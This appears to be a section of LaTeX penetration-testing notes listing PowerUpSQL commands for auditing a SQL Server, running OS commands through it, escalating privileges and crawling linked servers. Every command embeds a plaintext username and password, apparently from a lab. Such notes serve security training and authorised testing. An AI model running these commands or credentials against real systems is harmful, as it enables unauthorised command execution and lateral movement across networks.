\section{tools}

\subsection{PowerUpSQL}


\subsubsection{Audit}
\begin{verbatim}
Import-Module .\PowerUpSQL.psm1

Get-SQLInstanceDomain -Verbose

Get-SQLServerInfo -Username "ws_dev" -Password "4X6cuvDLNer7nwYN5LBZ" -Instance "SQL01"

Invoke-SQLAudit -Username "ws_dev" -Password "4X6cuvDLNer7nwYN5LBZ" -Instance "SQL01"
\end{verbatim}

\subsubsection{Command exec}
\begin{verbatim}
Invoke-SQLOSCmd -Username "ws_dev" -Password "4X6cuvDLNer7nwYN5LBZ" -Instance "SQL01" -Command "whoami"

Invoke-SQLOSCmdAgentJob -Username "ws_dev" -Password "4X6cuvDLNer7nwYN5LBZ" -Instance "SQL01" -SubSystem "CmdExec" -Command "whoami"

Invoke-SQLOSCmdOle -Username "ws_dev" -Password "4X6cuvDLNer7nwYN5LBZ" -Instance "SQL01" -Command "whoami"
\end{verbatim}

\subsubsection{Privesc}
\begin{verbatim}
Invoke-SQLEscalatePriv -Username "ws_dev" -Password "4X6cuvDLNer7nwYN5LBZ" -Instance "SQL01" -Verbose
\end{verbatim}

\subsubsection{Lateral Movement}
\begin{verbatim}
Get-SqlServerLinkCrawl -Username "ws_dev" -Password "4X6cuvDLNer7nwYN5LBZ" -Instance "SQL01"

$Out = Get-SQLServerLinkCrawl -Username "ws_dev" -Password "4X6cuvDLNer7nwYN5LBZ" -Instance "SQL01" -Query "SELECT SYSTEM_USER";

foreach ($Server in $out) {$CustomQuery = $Server.CustomQuery; foreach ($Row in $CustomQuery) {Write-Host($Row.Item(0));}};
\end{verbatim}


